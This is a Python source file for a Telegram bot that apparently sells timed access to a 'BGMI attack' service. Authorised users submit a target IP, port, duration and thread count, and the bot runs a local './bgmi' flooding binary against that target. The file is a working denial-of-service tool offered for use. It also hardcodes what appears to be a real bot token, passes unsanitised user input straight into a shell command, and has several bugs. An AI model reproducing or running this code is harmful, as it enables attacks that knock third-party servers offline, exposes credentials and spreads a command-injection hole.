import asyncio
import json
import logging
import time
import signal
from aiogram import Bot, Dispatcher
from aiogram.types import Message
from aiogram import filters
import datetime
import timedelta
import os 
import sys

logging.basicConfig(level=logging.INFO)


API_TOKEN = '7024043226:AAGSnTnDA3jl6fwmTTMtt1zzQ_cDowDVbSI'

AUTHORIZED_USERS = {}

def load_authorized_users():
    global AUTHORIZED_USERS
    try:
        with open("authorized_users.json", "r") as f:
            users = json.load(f)
            for user_id, user_data in users.items():
                if isinstance(user_data, dict) and "authorized_until" in user_data:
                    AUTHORIZED_USERS[int(user_id)] = {"authorized_until": datetime.datetime.fromtimestamp(user_data["authorized_until"])}
                else:
                    print(f"Warning: User {user_id} has no 'authorized_until' field in authorized_users.json")
    except FileNotFoundError:
        pass

def save_authorized_users():
    with open("authorized_users.json", "w") as f:
        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
        json.dump(users, f)

load_authorized_users()

ADMIN_ID = 5631558065

async def check_authorization(user_id):
    if user_id not in AUTHORIZED_USERS:
        return False
    user_data = AUTHORIZED_USERS[user_id]
    if user_data["authorized_until"] < datetime.datetime.now():
        del AUTHORIZED_USERS[user_id]
        save_authorized_users()
        return False
    return True

async def add_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
        return
    args = message.text.split()[1:]
    if len(args)!= 2:
        await message.answer("Usage: /adduser <user_id> <authorization_period>")
        return
    user_id = int(args[0])
    authorization_period = int(args[1])
    AUTHORIZED_USERS[user_id] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=authorization_period)}
    save_authorized_users()
    await message.answer(f"User {user_id} added with authorization period of {authorization_period} minutes.")

async def remove_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
        return
    args = message.text.split()[1:]
    if len(args)!= 1:
        await message.answer("Usage: /removeuser <user_id>")
        return
    user_id = int(args[0])
    if user_id in AUTHORIZED_USERS:
        del AUTHORIZED_USERS[user_id]
        save_authorized_users()
        await message.answer(f"User {user_id} removed.")
    else:
        await message.answer(f"User {user_id} not found.")

async def update_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
        return
    args = message.text.split()[1:]
    if len(args)!= 2:
        await message.answer("Usage: /updateuser <user_id> <new_authorization_period>")
        return
    user_id = int(args[0])
    new_authorization_period = int(args[1])
    if user_id in AUTHORIZED_USERS:
        AUTHORIZED_USERS[user_id]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=new_authorization_period)
        save_authorized_users()
        await message.answer(f"User {user_id} updated with new authorization period of {new_authorization_period} minutes.")
    else:
        await message.answer(f"User {user_id} not found.")

async def list_users(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
        return
    user_list = []
    for user_id, user_data in AUTHORIZED_USERS.items():
        user_list.append(f"{user_id} - Authorized until: {user_data['authorized_until']}")
    await message.answer("Authorized users:\n" + "\n".join(user_list))

async def broadcast(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
        return
    text = message.text.split(maxsplit=1)[1]
    for user_id in AUTHORIZED_USERS:
        try:
            await bot.send_message(user_id, text)
        except Exception as e:
            logging.error(f"Error sending message to user {user_id}: {e}")

def save_authorized_users():
    with open("authorized_users.json", "w") as f:
        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
        json.dump(users, f)

async def restart_bot(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
        return
    await message.answer("Restarting bot...")
    save_authorized_users()
    os.execl(sys.executable, sys.executable, *sys.argv)

async def user_info(message: Message):
    user_id = message.from_user.id
    user_data = AUTHORIZED_USERS.get(user_id)
    if user_data:
        approval_expiry = user_data["authorized_until"]
        if approval_expiry > datetime.datetime.now():
            approval_expiry_str = approval_expiry.strftime("%Y-%m-%d %H:%M:%S")
        else:
            approval_expiry_str = "Not approved"
    else:
        approval_expiry_str = "𝙊𝙥𝙥𝙨 𝙉𝙤𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @ZEUX_OP8"

    username = message.from_user.username
    await message.answer(f"🔖 𝙍𝙤𝙡𝙚: 𝙐𝙨𝙚𝙧\n"
                         f"🆔 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}\n"
                         f"👤 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n"
                         f"⏳ 𝘼𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙤𝙧 𝙀𝙭𝙥𝙞𝙧𝙮: {approval_expiry_str}")
    
attack_process = None
last_attack_time = 0
async def welcome_user(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @ZEUX_OP8 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
        return

    await message.answer(f"𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝘽𝙤𝙩! 🚀\n\n"

                         f"𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙨 𝙮𝙤𝙪 𝙩𝙤 𝙡𝙖𝙪𝙣𝙘𝙝 𝙖 𝘽𝙂𝙈𝙄 𝙖𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 𝙖 𝙩𝙖𝙧𝙜𝙚𝙩 𝙄𝙋 𝙖𝙣𝙙 𝙥𝙤𝙧𝙩.\n\n" 

                         f"𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨> <𝙩𝙝𝙧𝙚𝙖𝙙𝙨>  \n\n"    

                           "𝙀𝙭𝙖𝙢𝙥𝙡𝙚:/𝙗𝙜𝙢𝙞 20.235.94.237 17870 180 180\n\n") 

LAST_ATTACK_TIME = {}

async def bgmi_attack(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @ZEUX_OP8 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
        return
    if message.from_user.id not in AUTHORIZED_USERS:
        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @ZEUX_OP8 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨‌.")
        return

    current_time = time.time()

    if message.from_user.id in LAST_ATTACK_TIME and current_time - LAST_ATTACK_TIME[message.from_user.id] < 200:
        remaining_seconds = 200 - (current_time - LAST_ATTACK_TIME[message.from_user.id])
        minutes, seconds = divmod(remaining_seconds, 60)
        time_str = f"{int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} "
        await message.answer(f"𝙔𝙤𝙪 𝙢𝙪𝙨𝙩 𝙬𝙖𝙞𝙩 {time_str}. 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙨𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝙖𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙩𝙩𝙖𝙘𝙠")
        return

    args = message.text.split()[1:]
    if len(args) < 4:
        await message.answer(" 🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨> <𝙩𝙝𝙧𝙚𝙖𝙙𝙨> \n\n 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /𝙗𝙜𝙢𝙞 20.235.94.237 17870 180 180")
        return

    ip, port, time_seconds, threads = args
    command = f"./bgmi {ip} {port} {time_seconds} {threads}"

    LAST_ATTACK_TIME[message.from_user.id] = current_time

    await message.answer(f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🔫  \n  🎯𝙄𝙋: {ip}\n 🏖️𝙋𝙤𝙧𝙩: {port}\n ⌚𝙏𝙞𝙢𝙚: {time_seconds} 𝙨𝙚𝙘.")
    
    try:
        attack_process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await attack_process.communicate()

        response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {ip}:{port} \n 🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
        if stdout:
            response += f"\nOutput:\n{stdout.decode()}"
        if stderr:
            response += f"\nErrors:\n{stderr.decode()}"

        await message.answer(response)

    except Exception as e:
        await message.answer(f"Error: {e}")

async def bgmi_stop(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @ZEUX_OP8 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
        return
    if message.from_user.id not in AUTHORIZED_USERS:
        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @ZEUX_OP8 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨‌.")
        return
    # Rest of the bgmi stop code
    global attack_process
    if attack_process is not None:
        attack_process.terminate()
        attack_process.wait()
        attack_process = None
        await message.answer("🚀Attack stopped.")
    else:
        await message.answer("No attack is currently running.")

async def main():
    bot = Bot(token=API_TOKEN)
    dp = Dispatcher()

    # Register handlers
    dp.message.register(welcome_user, filters.Command("start"))
    dp.message.register(bgmi_attack, filters.Command(commands=['bgmi']))
    dp.message.register(broadcast, filters.Command("broadcast"))
    dp.message.register(bgmi_stop, filters.Command("stop"))
    dp.message.register(add_user, filters.Command("adduser"))
    dp.message.register(remove_user, filters.Command("removeuser"))
    dp.message.register(update_user, filters.Command("updateuser"))
    dp.message.register(list_users, filters.Command("listuser"))
    dp.message.register(restart_bot, filters.Command("restart"))
    dp.message.register(user_info, filters.Command("userinfo"))

    async def remove_expired_users():
        while True:
            global AUTHORIZED_USERS
            for user_id in list(AUTHORIZED_USERS.keys()):
                user_data = AUTHORIZED_USERS[user_id]
                if user_data["authorized_until"] < datetime.datetime.now():
                    del AUTHORIZED_USERS[user_id]
                    save_authorized_users()
            await asyncio.sleep(60)

  
    asyncio.create_task(remove_expired_users())

    
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())